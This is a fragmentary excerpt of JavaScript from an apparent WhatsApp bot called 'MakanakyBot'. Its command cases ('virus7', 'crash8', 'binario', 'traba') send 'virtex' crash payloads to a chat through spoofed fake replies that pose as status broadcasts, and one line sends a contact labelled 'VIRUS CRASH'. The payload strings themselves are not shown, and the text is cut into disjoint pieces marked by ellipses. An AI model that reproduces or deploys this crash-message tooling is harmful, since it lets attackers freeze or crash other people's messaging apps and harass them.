...
conn.fakeReply(from, virtex1, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex2, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex3, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex4, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex5, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')} 
break
...
"orderTitle": `© 😋`,
"sellerJid": "51986206184@s.whatsapp.net",
...
conn.fakeReply(from, virtex6, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex7, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')
conn.fakeReply(from, virtex8, '0@s.whatsapp.net', '🔥 *By MakanakyBot* 🔥', 'status@broadcast')}
break    
...
await conn.sendContact(from, '🔥 VIRUS CRASH BY MAKANAKY 🔥', fkontaak)}
break   
case 'virus7': case 'c7': case 'binario7': case 'traba7': case 'crash7': {
conn.fakeReply(from, virtex9, '0@s.whatsapp.net', '🔥 *By MakanakyBot⁩* 🔥', 'status@broadcast')}
break 
case 'virus8': case 'c8': case 'binario8': case 'traba8': case 'crash8': {
conn.fakeReply(from, virtex10, '0@s.whatsapp.net', '🔥 *By MakanakyBot 🔥', 'status@broadcast')}
break    
}
